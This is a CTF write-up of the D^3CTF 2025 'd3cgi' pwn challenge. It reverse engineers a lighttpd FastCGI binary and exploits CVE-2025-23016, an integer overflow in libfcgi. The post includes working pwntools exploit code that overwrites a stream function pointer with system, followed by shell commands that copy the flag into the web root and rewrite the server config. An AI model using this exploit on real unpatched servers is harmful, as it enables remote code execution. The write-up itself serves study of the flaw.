---
date: 2025-06-02T00:12:54+02:00
# description: ""
# image: ""
lastmod: 2025-06-02
showTableOfContents: true
tags: ["pwn", "writeup", "cgi"]
title: "D^3CTF 2025 | d3cgi"
type: "post"
---

## Overview

A few days ago, I played **D^3CTF 2025** to try out some medium and hard PWN challenges.  
This was the only challenge I managed to solve, and I believe it was the easiest one.  
It was a fun challenge to solve and a valuable experience, as it involved a real-world vulnerability.

The challenge comes with a `challenge` binary, a `lighttpd` binary, a `libs/` directory, `lighttpd.conf`, a `Dockerfile`,
 and some shell scripts to simplify setup in a Docker container.  
The `challenge` binary is a CGI application served over the web using the Lighttpd web server.  
Here's the checksec output for the `challenge` binary:

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8042000)
    RUNPATH:    b'./libs'
```
It’s a 32-bit binary with no PIE and partial RELRO, which is useful information as it opens up several exploitation possibilities.  

### Binary analysis
I began reverse engineering the challenge binary, looking for vulnerabilities.  
It turned out to be a very simple binary, the `main` function was primarily responsible for accepting and parsing requests.
I renamed all functions as I saw fit, and in the following text, I’ll refer to them using the names I assigned.
```c
  FCGX_Init();
  FCGX_InitRequest(&request, 0, 0);
  while ( FCGX_Accept_r(&request) >= 0 )
  {
    ParseRequest(&request);
    FCGX_Finish_r(&request);
  }
```
The `ParseRequest` function simply iterates over the handlers.  
To make things clearer, I created a struct to represent a handler.
```c
struct Handler
{
  char *route;
  void (*handler)(FCGX_Request *);
  char *methods[8];
};

void __cdecl ParseRequest(FCGX_Request *req)
{
  Handler *i; // [esp+0h] [ebp-18h]
  const char **j; // [esp+4h] [ebp-14h]
  const char *route; // [esp+8h] [ebp-10h]
  const char *method; // [esp+Ch] [ebp-Ch]

  route = FCGX_GetParam("SCRIPT_NAME", req->envp);
  method = FCGX_GetParam("REQUEST_METHOD", req->envp);
  if ( route && *route == '/' )
  {
    for ( i = handlers; i->route; ++i )
    {
      if ( !strcmp(route, i->route) )
      {
        for ( j = (const char **)i->methods; *j; ++j )
        {
          if ( !strcmp(method, *j) )
          {
            i->handler(req);
            return;
          }
        }
        err405(req);
        return;
      }
    }
  }
  err404(req);
}
```
There are three handlers, and they look like this:
```c
handlers = [
    {
        route="/",
        handler=home
        methods=["GET","POST"]
    },
    {
        route="/index.html",
        handler=home
        methods=["GET","POST"]
    },
    {
        route="/uptime",
        handler=uptime
        methods=["GET"]
    }
]
```
The `home` function simply prints "HELLO!".  
The interesting one is `uptime`, which calls the `execute` function to retrieve the system uptime.
```c
int __cdecl home(FCGX_Request *req)
{
  FCGX_FPrintF(req->out, "Content-type: text/html\r\n\r\n");
  FCGX_FPrintF(req->out, "<html><body><h1>HELLO!</h1></body></html>");
  return 0;
}

int __cdecl uptime(FCGX_Request *req)
{
  char *ptr; // [esp+Ch] [ebp-Ch]

  ptr = execute("/usr/bin/uptime");
  FCGX_FPrintF(req->out, "Content-type: text/html\r\n\r\n");
  if ( ptr )
  {
    FCGX_FPrintF(req->out, "<html><body><h1>Uptime:</h1><p>%s</p></body></html>", ptr);
    free(ptr);
  }
  else
  {
    FCGX_FPrintF(req->out, "<html><body><h1>Error fetching uptime</h1></body></html>");
  }
  return 0;
}
```
`execute` doesn’t do much more than simply forking a child process
and executing the provided command to get its output.
But that is actually very useful because PIE is not enabled
and because of that the `system` PLT address is known.
```c
char *__cdecl execute(const char *filename)
{
  char *result; // eax
  _BYTE *buf; // [esp+18h] [ebp-20h]
  __pid_t pid; // [esp+1Ch] [ebp-1Ch]
  int pipe_[2]; // [esp+24h] [ebp-14h] BYREF
  unsigned int canary; // [esp+2Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  buf = malloc(0x1000u);
  if ( buf )
  {
    if ( pipe(pipe_) == -1 )
    {
      result = 0;
    }
    else
    {
      pid = fork();
      if ( pid == -1 )
      {
        result = 0;
      }
      else
      {
        if ( !pid )
        {
          dup2(pipe_[1], 1);
          close(pipe_[0]);
          close(pipe_[1]);
          system(filename);
          exit(0);
        }
        close(pipe_[1]);
        buf[read(pipe_[0], buf, 0xFFFu)] = 0;
        wait(0);
        result = buf;
      }
    }
  }
  else
  {
    result = 0;
  }
  if ( canary != __readgsdword(0x14u) )
    stack_check_fail();
  return result;
}
```
I couldn’t find any vulnerable part in the code that would lead to RCE and solving the challenge.  
Therefore, I changed my approach and began searching for known vulnerabilities in `libfcgi`.

### Finding the vulnerability

I started researching `libfcgi` and quickly came across **[CVE-2025-23016](https://nvd.nist.gov/vuln/detail/CVE-2025-23016)**,  
a recent vulnerability discovered in the 32-bit version of `libfcgi`.  

The vulnerability is located in the `ReadParams` function, which takes an `FCGX_Stream*`
 parameter to read data from the socket and populates a pointer to a `Params` structure.
```c
static int ReadParams(Params *paramsPtr, FCGX_Stream *stream)
{
    int nameLen, valueLen;
    unsigned char lenBuff[3];
    char *nameValue;

    while((nameLen = FCGX_GetChar(stream)) != EOF) {
        /*
         * Read name length (one or four bytes) and value length
         * (one or four bytes) from stream.
         */
        if((nameLen & 0x80) != 0) {
            if(FCGX_GetStr((char *) &lenBuff[0], 3, stream) != 3) {
                SetError(stream, FCGX_PARAMS_ERROR);
                return -1;
            }
            nameLen = ((nameLen & 0x7f) << 24) + (lenBuff[0] << 16)
                    + (lenBuff[1] << 8) + lenBuff[2];
        }
        if((valueLen = FCGX_GetChar(stream)) == EOF) {
            SetError(stream, FCGX_PARAMS_ERROR);
            return -1;
        }
        if((valueLen & 0x80) != 0) {
            if(FCGX_GetStr((char *) &lenBuff[0], 3, stream) != 3) {
                SetError(stream, FCGX_PARAMS_ERROR);
                return -1;
            }
            valueLen = ((valueLen & 0x7f) << 24) + (lenBuff[0] << 16)
                    + (lenBuff[1] << 8) + lenBuff[2];
        }
        /*
         * nameLen and valueLen are now valid; read the name and value
         * from stream and construct a standard environment entry.
         */
        nameValue = (char *)Malloc(nameLen + valueLen + 2);
        if(FCGX_GetStr(nameValue, nameLen, stream) != nameLen) {
            SetError(stream, FCGX_PARAMS_ERROR);
            free(nameValue);
            return -1;
        }
        *(nameValue + nameLen) = '=';
        if(FCGX_GetStr(nameValue + nameLen + 1, valueLen, stream)
                != valueLen) {
            SetError(stream, FCGX_PARAMS_ERROR);
            free(nameValue);
            return -1;
        }
        *(nameValue + nameLen + valueLen + 1) = '\0';
        PutParam(paramsPtr, nameValue);
    }
    return 0;
}
```
The vulnerable part is the call to `Malloc(nameLen + valueLen + 2)` because an integer overflow can occur.  
This overflow leads to a heap overflow when data for the name and value is read into the allocated chunk.  

There is a safeguard that prevents obvious integer overflows by ANDing `nameLen` and `valueLen` with `0x7f` if reading a 4-byte integer instead of a single byte.  
However, if two values of `0x7fffffff` are added, the result becomes `0xfffffffe`, and after adding 2, it wraps around to 0, bypassing this check.

## Exploitation

I followed this [PoC](https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library), which helped me develop my exploit.  
The exploitation idea is to place an overflowable chunk right after the `FCGX_Stream` structure, allowing us to overflow it and overwrite function pointers to achieve RCE.
```c
typedef struct FCGX_Stream {
    unsigned char *rdNext;    /* reader: first valid byte
                               * writer: equals stop */
    unsigned char *wrNext;    /* writer: first free byte
                               * reader: equals stop */
    unsigned char *stop;      /* reader: last valid byte + 1
                               * writer: last free byte + 1 */
    unsigned char *stopUnget; /* reader: first byte of current buffer
                               * fragment, for ungetc
                               * writer: undefined */
    int isReader;
    int isClosed;
    int wasFCloseCalled;
    int FCGI_errno;                /* error status */
    void (*fillBuffProc) (struct FCGX_Stream *stream);
    void (*emptyBuffProc) (struct FCGX_Stream *stream, int doClose);
    void *data;
} FCGX_Stream;
```
The target function for this exploit is `fillBuffProc` because it is called in `FCGX_GetChar` as `stream->fillBuffProc(stream);`.  
```c
int FCGX_GetChar(FCGX_Stream *stream)
{
    if (stream->isClosed || ! stream->isReader)
        return EOF;

    if (stream->rdNext != stream->stop)
        return *stream->rdNext++;

    stream->fillBuffProc(stream);
    if (stream->isClosed)
        return EOF;

    stream->stopUnget = stream->rdNext;
    if (stream->rdNext != stream->stop)
        return *stream->rdNext++;

    ASSERT(stream->isClosed); /* bug in fillBufProc if not */
    return EOF;
}
```
The first step is to send a dummy request to allocate and free some chunks, preparing the heap for the second stage where the actual exploitation occurs.  
I used functions from the **PoC** to make requests to the CGI application.
```py
def dummy_request():
    p = remote(HOST, PORT)

    header = makeHeader(9, 0, 0, 0)
    payload = flat(
        makeHeader(1, 1, 8, 0),
        makeBeginReqBody(1, 0),
        header,
        p8(75)*2 + b"A"*(75*2)
    )

    p.send(payload)
    p.close()


dummy_request()
dummy_request()
```
I used the first dummy request to trigger allocations and frees, and the second one to pause at `FCGX_GetChar` for inspecting the heap.  

![heap](/blog/images/d3cgi/heap.png)  

In the attack function, I first filled a large freed chunk, and then implemented the exploitation idea as described earlier.

```py
def attack(cmd : bytes):
    assert(len(cmd) <= 18)
    p = remote(HOST, PORT)

    header = makeHeader(9, 0, 0x2500, 0)
    payload = flat(
        makeHeader(1, 1, 8, 0),
        makeBeginReqBody(1, 0),
        header,
        # 0xffb * 2 + 2 = 0x1ff8 -> 0x2000 chunk
        p32(0xffb | (1 << 31), endianness='big') * 2,
        b"A" * (0xffb * 2),
        # 0x7fffffff * 2 + 2 = 0x0 -> 0x10 chunk
        p32(0xffffffff)*2,
        # chunk metadata
        b"A" * 0x10,
        # FCGX_Stream
        b" ;" + cmd.ljust(18, b' '),
        p32(0) * 3,
        # fillBuffProc
        p32(exe.plt["system"])
    )

    p.send(payload)
    p.close()


dummy_request()
attack(b"ls")
```
It worked, so all that remained was to find a way to retrieve the flag.
```sh
$ spawn-fcgi -n -p 9555 -- ./challenge
sh: line 1: T: command not found
manjaro
zsh: segmentation fault (core dumped)  spawn-fcgi -n -p 9555 -- ./challenge
```

### Retrieving the flag

There was a length-limited command, so I couldn’t retrieve the flag directly.  
Instead, I first decided to create a function that would write a file on the remote system, which I could later execute.
```py
def attack_and_wait(cmd: bytes):
    dummy_request()
    attack(cmd)
    sleep(1)


def write_file(file):
    lines = [i.strip() for i in open(file).readlines()]
    for ln in lines:
        for i in range(0, len(ln), 5):
            attack_and_wait(f"echo -n '{ln[i:i+5]}'>>a".encode())
        attack_and_wait(b"echo >>a")
```
The file I chose to write modified the Lighttpd configuration to enable serving static files,  
and copied the flag to the `www` directory, which is accessible through the Lighttpd server.
```sh
cp /flag www
sed -i "s/disable/enable/" lighttpd.conf
sed -i "s/mod_fastcgi/mod_staticfile/" lighttpd.conf
pkill lighttpd
sleep 2
./run.sh
```
Finally, I executed the attack as follows:
```py
write_file("script.sh")
attack_and_wait(b"sh a")
```
After that, I simply used `curl` on the web server and retrieved the flag:
```sh
$ curl localhost:8888/flag
ctf{fake_flag_for_testing}
```
## Conclusion
I recommend reading the [PoC](https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library) if you want more details about exploiting this vulnerability.  
I also believe this challenge was heavily inspired by that PoC, as the binary is quite similar to the one used in their demonstration.

You can check out the full exploit here: [exploit.py](/blog/scripts/d3cgi/exploit.py)
